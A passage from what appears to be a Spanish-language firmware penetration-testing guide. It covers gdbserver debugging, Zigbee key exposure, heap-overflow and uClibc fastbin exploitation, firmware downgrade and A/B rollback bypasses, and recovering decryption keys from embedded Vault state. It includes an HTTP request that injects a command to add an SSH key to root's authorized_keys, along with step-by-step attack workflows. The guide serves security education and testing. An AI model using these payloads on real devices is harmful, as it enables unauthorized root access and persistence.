Para aislar fallos de forma reproducible, escribe archivos marcadores con marcas de tiempo en un volumen estable con permisos de escritura y verifícalos sin conexión; `/dev/kmsg`, las FIFO y las consolas transitorias pueden producir falsos negativos por limitación de tasa o por la terminación prematura del proceso. Compara también las interfaces exactas entre capas antes de modificar código no relacionado: `uname -r` frente a `/lib/modules/`, las funciones de ext4 en disco frente a la configuración del kernel y la generación de `libGL` de Mesa frente a la ABI del controlador DRI y los nombres de controladores derivados de PCI. Un componente puede existir e incluso cargarse correctamente con `dlopen()` y, aun así, no ser utilizable porque el consumidor espera una ABI diferente.<sup>[[11]](#references)</sup>

## Análisis dinámico en la práctica

En esta etapa, se utiliza para el análisis un entorno de dispositivo real o emulado. Es esencial mantener el acceso shell al sistema operativo y al sistema de archivos. Es posible que la emulación no reproduzca perfectamente las interacciones con el hardware, por lo que puede ser necesario reiniciarla ocasionalmente. El análisis debe volver a examinar el sistema de archivos, explotar las páginas web y los servicios de red expuestos, y explorar las vulnerabilidades del bootloader. Las pruebas de integridad del firmware son fundamentales para identificar posibles vulnerabilidades de backdoor.

## Técnicas de análisis en tiempo de ejecución

El análisis en tiempo de ejecución consiste en interactuar con un proceso o binario en su entorno operativo, utilizando herramientas como gdb-multiarch, Frida y Ghidra para establecer breakpoints e identificar vulnerabilidades mediante fuzzing y otras técnicas.

Para objetivos embebidos sin un debugger completo, **copia un `gdbserver` enlazado estáticamente** al dispositivo y conéctate de forma remota:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapeo de mensajes Zigbee / coprocesador de radio

En los hubs IoT, la pila RF suele estar dividida entre un **MCU de radio** y un proceso de espacio de usuario de Linux. Un flujo de trabajo útil consiste en mapear la ruta:<sup>[[8]](#references)</sup>

1. **Trama RF** en el aire
2. **Parser del lado del controlador** en el MCU de radio
3. **Protocolo de texto o TLV serial/UART** reenviado a Linux (por ejemplo, `/dev/tty*`)
4. **Despachador de la aplicación** en el daemon principal
5. **Manejador específico del protocolo / máquina de estados**

Esta arquitectura crea dos objetivos de ingeniería inversa en lugar de uno. Si el controlador convierte las tramas de radio binarias en un protocolo de texto como `Group,Command,arg1,arg2,...`, identifica:

- Los **grupos de mensajes** y las tablas de despacho
- Qué mensajes pueden provenir de la **red** y cuáles del propio controlador
- Los **campos discriminadores exactos específicos del fabricante** (por ejemplo, `manufacturer_code` y `cluster_command` de Zigbee)
- Qué manejadores solo son accesibles durante las fases de **commissioning**, descubrimiento o descarga de firmware/modelo

En Zigbee, captura el tráfico de emparejamiento y comprueba si el objetivo todavía depende de la **Link Key** predeterminada `ZigBeeAlliance09`. Si es así, es posible que la captura del tráfico de commissioning exponga la **Network Key**. Los códigos de instalación de Zigbee 3.0 reducen esta exposición, así que comprueba si el dispositivo probado realmente los exige.

### Manejadores de protocolos específicos del fabricante y accesibilidad controlada por FSM

Los comandos Zigbee/ZCL específicos del fabricante suelen ser un objetivo mejor que los clústeres estandarizados, porque alimentan **código de análisis personalizado** y **FSM** internas con una validación menos probada.<sup>[[8]](#references)</sup>

Flujo de trabajo práctico:

- Analiza el despachador de comandos hasta encontrar el **manejador exclusivo del fabricante**.
- Recupera las tablas de **estado**, **evento**, **comprobación**, **acción** y **siguiente estado** de la FSM.
- Identifica los **estados de transición** que avanzan automáticamente y las ramas de reintento/error que finalmente restablecen o liberan el estado controlado por el atacante.
- Confirma qué intercambios de protocolo legítimos se necesitan para colocar el daemon en el estado vulnerable, en lugar de asumir que el manejador vulnerable siempre es accesible.

Para protocolos sensibles al tiempo, la reproducción de paquetes desde un framework de Python puede ser demasiado lenta. Un método más fiable consiste en emular un dispositivo legítimo en hardware real (por ejemplo, un **nRF52840**) con una pila de nivel de fabricante, para poder exponer los **endpoints**, **atributos** y tiempos de commissioning correctos.

### Clase de bug de descarga fragmentada en daemons embebidos

Una clase recurrente de bugs de firmware aparece en las descargas **fragmentadas de blobs/modelos/configuraciones**:<sup>[[8]](#references)</sup>

1. El **primer fragmento** (`offset == 0`) guarda `ctx->total_size` y asigna `malloc(total_size)`.
2. Los fragmentos posteriores solo validan los campos **locales al paquete** controlados por el atacante, como `packet_total_size >= offset + chunk_len`.
3. La copia usa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sin comprobar que no exceda el **tamaño asignado originalmente**.

Esto permite que un atacante envíe:

- Un primer fragmento válido con un tamaño total declarado **pequeño** para forzar una asignación pequeña en el heap.
- Un fragmento posterior con el **offset esperado**, pero un `chunk_len` mayor.
- Un tamaño local al paquete falsificado que supere las comprobaciones recientes y, a la vez, desborde el búfer asignado originalmente.

Cuando la ruta vulnerable está protegida por lógica de commissioning, la explotación debe incluir suficiente **emulación del dispositivo** para llevar el objetivo al estado esperado de descarga del modelo o del blob antes de enviar los fragmentos malformados.

### Desencadenadores de `free()` controlados por el protocolo

En los daemons embebidos, la manera más fácil de desencadenar la explotación de metadatos del heap a menudo no es «esperar a que se ejecute la limpieza», sino **forzar el propio manejo de errores del protocolo**:<sup>[[8]](#references)</sup>

- Envía fragmentos posteriores malformados para llevar la FSM a estados de **reintento** o **error**.
- Supera el umbral de reintentos para que el daemon **restablezca el contexto** y libere el búfer corrupto.
- Usa este `free()` predecible para activar primitivas del asignador antes de que el proceso se bloquee por otros motivos.

Esto resulta especialmente útil contra asignadores **similares a musl/uClibc/dlmalloc** en Linux embebido, donde corromper los metadatos de los chunks puede convertir la lógica de unlink/unbin en una primitiva de escritura. Un patrón estable consiste en corromper un **campo de tamaño** para redirigir el recorrido del asignador a **fake chunks preparados dentro del búfer desbordado**, en lugar de sobrescribir inmediatamente los punteros reales de los bins y bloquear el proceso.

## Explotación binaria y prueba de concepto

Desarrollar un PoC para las vulnerabilidades identificadas requiere un conocimiento profundo de la arquitectura objetivo y programación en lenguajes de bajo nivel. Las protecciones de runtime binario son poco frecuentes en sistemas embebidos, pero, cuando están presentes, pueden ser necesarias técnicas como Return Oriented Programming (ROP).

### Notas sobre la explotación de fastbin de uClibc (Linux embebido)

- **Fastbins + consolidación:** uClibc usa fastbins similares a los de glibc. Una asignación grande posterior puede activar `__malloc_consolidate()`, por lo que cualquier fake chunk debe superar las comprobaciones (tamaño válido, `fd = 0` y chunks circundantes considerados «en uso»).<sup>[[6]](#references)</sup>
- **Binarios no PIE bajo ASLR:** si ASLR está habilitado, pero el binario principal es **no PIE**, las direcciones `.data/.bss` dentro del binario son estables. Puedes apuntar a una región que ya se parezca a una cabecera válida de chunk del heap para que una asignación de fastbin termine en una **tabla de punteros a funciones**.
- **NUL que detiene el parser:** al analizar JSON, un `\x00` en el payload puede detener el análisis y conservar los bytes controlados por el atacante que le siguen para un pivote de stack/cadena ROP.
- **Shellcode mediante `/proc/self/mem`:** una cadena ROP que invoque `open("/proc/self/mem")`, `lseek()` y `write()` puede colocar shellcode ejecutable en un mapping conocido y saltar a él.

## Sistemas operativos preparados para el análisis de firmware

Sistemas operativos como [AttifyOS](https://github.com/adi0x90/attifyos) y [EmbedOS](https://github.com/scriptingxss/EmbedOS) proporcionan entornos preconfigurados para pruebas de seguridad de firmware, equipados con las herramientas necesarias.

## Sistemas operativos preparados para analizar firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS es una distro diseñada para ayudarte a realizar evaluaciones de seguridad y pruebas de penetración de dispositivos del Internet de las cosas (IoT). Ahorra mucho tiempo al proporcionar un entorno preconfigurado con todas las herramientas necesarias.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): sistema operativo de pruebas de seguridad embebida basado en Ubuntu 18.04 y precargado con herramientas para pruebas de seguridad de firmware.

## Ataques de downgrade de firmware y mecanismos de actualización inseguros

Aunque un fabricante implemente comprobaciones criptográficas de firma para las imágenes de firmware, con frecuencia se omite la **protección contra la reversión de versión (downgrade)**. Si el cargador de arranque o de recuperación solo verifica la firma con una clave pública integrada, pero no compara la *versión* (o un contador monotónico) de la imagen que se va a instalar, un atacante puede instalar legítimamente un **firmware más antiguo y vulnerable que todavía tenga una firma válida**, reintroduciendo así vulnerabilidades corregidas.<sup>[[4]](#references)</sup>

Flujo de ataque típico:

1. **Obtén una imagen antigua firmada**
   * Descárgala del portal público de descargas del fabricante, de su CDN o de su sitio de soporte.
   * Extráela de aplicaciones móviles/de escritorio complementarias (por ejemplo, dentro de un APK de Android, en `assets/firmware/`).
   * Consíguela en repositorios de terceros como VirusTotal, archivos de Internet, foros, etc.
2. **Sube o sirve la imagen al dispositivo** mediante cualquier canal de actualización expuesto:
   * Interfaz web, API de aplicación móvil, USB, TFTP, MQTT, etc.
   * Muchos dispositivos IoT de consumo exponen endpoints HTTP(S) *sin autenticación* que aceptan blobs de firmware codificados en Base64, los decodifican del lado del servidor e inician la recuperación/actualización.
3. Tras el downgrade, explota una vulnerabilidad corregida en una versión más reciente (por ejemplo, un filtro contra command injection añadido posteriormente).
4. Opcionalmente, vuelve a instalar la imagen más reciente o desactiva las actualizaciones para evitar que te detecten una vez obtenida la persistencia.

### Ejemplo: command injection tras un downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

En el firmware vulnerable (con downgrade), el parámetro `md5` se concatena directamente en un comando de shell sin sanitizar, lo que permite inyectar comandos arbitrarios (en este caso, habilitar el acceso root mediante claves SSH). Las versiones posteriores del firmware incorporaron un filtro básico de caracteres, pero la ausencia de protección contra downgrade hace que la corrección sea inútil.<sup>[[4]](#references)</sup>

### Extracción de firmware de aplicaciones móviles

Muchos proveedores incluyen imágenes completas del firmware en sus aplicaciones móviles complementarias para que la aplicación pueda actualizar el dispositivo por Bluetooth/Wi-Fi. Estos paquetes suelen almacenarse sin cifrar en el APK/APEX, en rutas como `assets/fw/` o `res/raw/`. Herramientas como `apktool`, `ghidra` o incluso el comando `unzip` permiten extraer imágenes firmadas sin tocar el hardware físico.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Bypass de anti-rollback solo en el updater en diseños de slots A/B

Algunos proveedores sí implementan un **ratchet** anti-downgrade, pero solo dentro de la lógica del *updater* (por ejemplo, una rutina UDS sobre CAN, un comando de recuperación o un agente OTA en userspace). Si el **bootloader** luego solo comprueba la firma/CRC de la imagen y confía en la tabla de particiones o en los metadatos del slot, la protección contra rollback todavía puede evadirse.<sup>[[7]](#references)</sup>

Diseño débil habitual:

- Los metadatos del firmware contienen tanto un descriptor de versión como un **ratchet de seguridad** / contador monotónico.
- El updater compara el ratchet de la imagen con un valor almacenado en almacenamiento persistente y rechaza imágenes firmadas más antiguas.
- El bootloader **no** analiza ese ratchet y solo verifica la cabecera, el CRC y la firma antes de arrancar el slot seleccionado.
- La activación del slot se almacena por separado en una tabla de particiones o en un contador de generación por slot y **no está vinculada criptográficamente** al digest exacto del firmware que se validó.

Esto crea una primitiva de **validar una imagen / arrancar otra imagen** en sistemas de doble slot. Si el atacante puede hacer que el updater marque el slot B como próximo destino de arranque usando una imagen firmada actual y luego sobrescribir el slot B antes del reinicio, el bootloader podría arrancar la imagen degradada porque solo confía en los metadatos del slot que ya se confirmaron.

Patrón de abuso habitual:

1. Sube un firmware **actual y firmado** al slot pasivo y ejecuta la rutina normal de validación/cambio para que la disposición marque ese slot como el próximo activo.
2. **No reinicies todavía**. Vuelve a ejecutar la rutina de preparación/borrado del slot en la misma sesión.
3. Abusa de la lógica obsoleta del estado de arranque o de la selección de slot para que el updater borre el **mismo slot físico** que acaba de promover.
4. Escribe un firmware **más antiguo, pero aún firmado**, en ese slot.
5. Omite la rutina de validación que aplica el ratchet y reinicia directamente.
6. El bootloader selecciona el slot promovido, solo verifica la firma/integridad y arranca la imagen antigua.

Qué buscar al hacer reversing de implementaciones de actualización A/B:

- Selección del slot derivada de **flags de arranque** que no se actualizan tras un cambio exitoso.
- Una rutina del tipo `prepare_passive_slot()` que borra un slot usando un estado obsoleto en vez de la **disposición confirmada actual**.
- Una función del tipo `part_write_layout()` que solo incrementa un **contador de generación** / flag de activo y no almacena el hash de la imagen validada.
- Comprobaciones del ratchet implementadas en userspace o en el código del updater, pero **no** en las etapas de ROM / bootloader / secure boot.
- Rutinas de borrado o recuperación que dejan el slot marcado como arrancable incluso después de borrar y reescribir su contenido.

### Lista de comprobación para evaluar la lógica de actualización

* ¿El transporte y la autenticación del *endpoint de actualización* están adecuadamente protegidos (TLS + autenticación)?
* ¿El dispositivo compara **números de versión** o un **contador monotónico anti-rollback** antes de flashear?
* ¿La imagen se verifica dentro de una cadena de secure boot (por ejemplo, las firmas se comprueban mediante código ROM)?
* ¿El **bootloader aplica el mismo ratchet** que el updater, en lugar de limitarse a comprobar la firma/CRC?
* ¿Los metadatos de activación del slot están **vinculados al digest/versión del firmware validado**, o se puede modificar un slot después de promoverlo?
* Tras completarse correctamente un cambio de slot, ¿el dispositivo se ve obligado a reiniciarse o siguen siendo accesibles otras rutinas de actualización/borrado durante la misma sesión?
* ¿El código de userland realiza comprobaciones adicionales de coherencia (por ejemplo, mapa de particiones permitido, número de modelo)?
* ¿Los flujos de actualización *parcial* o de *copia de seguridad* reutilizan la misma lógica de validación?

> 💡  Si falta alguno de los elementos anteriores, es probable que la plataforma sea vulnerable a ataques de rollback.

## Firmware vulnerable para practicar

Para practicar cómo descubrir vulnerabilidades en firmware, usa los siguientes proyectos de firmware vulnerable como punto de partida.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Recuperación de claves de descifrado de firmware a partir del estado de KMS/Vault integrado

Cuando una imagen de actualización combina metadatos pequeños en texto plano con un blob grande de alta entropía, analiza primero el contenedor antes de intentar fuerza bruta:<sup>[[1]](#references)</sup>

- Vuelca las cabeceras, los offsets y los límites de línea con `hexdump`, `xxd`, `strings -tx`, `base64 -d` y `binwalk -E`.
- `Salted__` suele indicar el formato `enc` de OpenSSL: los siguientes 8 bytes son la sal y los bytes restantes son el texto cifrado.
- Un campo Base64 que se decodifica en exactamente `256` bytes es un indicio claro de que se trata de un texto cifrado RSA-2048 que envuelve una contraseña de firmware/clave de sesión aleatoria.
- El material PGP separado que aparece en el mismo archivo suele proteger solo la autenticidad; no des por hecho que es el mecanismo de confidencialidad.

Si la búsqueda de claves estáticas (`grep`, `strings`, búsquedas de PEM/PGP) falla, haz reversing de la **ruta de descifrado operativa** en lugar de limitarte a buscar claves privadas:

- Descompila el updater / binario de gestión y sigue quién lee el blob cifrado, qué helper/API lo desenvuelve y qué nombre lógico de clave solicita.
- Busca en el sistema de archivos raíz extraído el estado de KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), además de los archivos de unidades y los scripts de init.
- Trata el texto plano `vault operator unseal ...`, las claves de recuperación, los tokens de bootstrap o los scripts locales de auto-unseal de KMS como equivalentes a material de clave privada.

Si el dispositivo incluye el binario original de Vault y el backend de almacenamiento, reproducir ese entorno suele ser más fácil que reimplementar los componentes internos de Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Con acceso root en el KMS clonado:

- Haz que las claves transit se puedan exportar solo dentro del clon aislado: `vault write transit/keys/<name>/config exportable=true`
- Exporta la clave unwrap: `vault read transit/export/encryption-key/<name>`
- Prueba la clave RSA recuperada con el par exacto de padding/hash que usa el KMS. Un fallo al descifrar con PKCS#1 v1.5 y otro con el descifrado OAEP predeterminado **no** demuestran que la clave sea incorrecta; muchos flujos respaldados por Vault usan OAEP con SHA-256, mientras que las bibliotecas comunes usan SHA-1 de forma predeterminada.
- Si el payload comienza con `Salted__`, reproduce exactamente el KDF de OpenSSL del proveedor (`EVP_BytesToKey`, a menudo MD5 en dispositivos heredados) antes de intentar descifrar con AES-CBC.

Esto convierte el problema de «firmware cifrado» en un problema más general: **recuperar las claves operativas del dispositivo y luego reproducir offline los parámetros exactos de unwrap + KDF**.

## Formación y certificaciones

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Descifrado de firmware con Claude: habilidades de nivel sénior, autonomía de nivel júnior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodología de pruebas de seguridad de firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Hacking práctico de IoT: la guía definitiva para atacar el Internet de las cosas](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Explotación de zero-days en hardware abandonado – blog de Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Cómo un dispositivo inteligente de 20 $ me dio acceso a tu casa](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Ahora me ves: ahora estás pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Explotación del Tesla Wall Connector desde el conector del puerto de carga - Parte 2: omisión de la protección contra downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Haz que parpadee: explotación over-the-air del Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS en QEMU, parte 1: desempaquetado](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Documentación del kernel de Linux - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS en QEMU, parte 2: depuración y corrección](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Contraseñas del BIOS de Dell: el cifrado XOR débil permite recuperarlas desde la memoria flash SPI (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Herramientas para recuperar contraseñas del BIOS de Dell](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Repaso del hacking de hardware, parte 2](https://voidstarsec.com/blog/brushing-up-part-2)
- [15] [Cómo y por qué hackeamos la hardware wallet Cypherock: la historia completa](https://www.darknavy.org/blog/how_and_why_we_hacked_cypherock_hardware_wallet_the_full_story/)
{{#include ../../banners/hacktricks-training.md}}
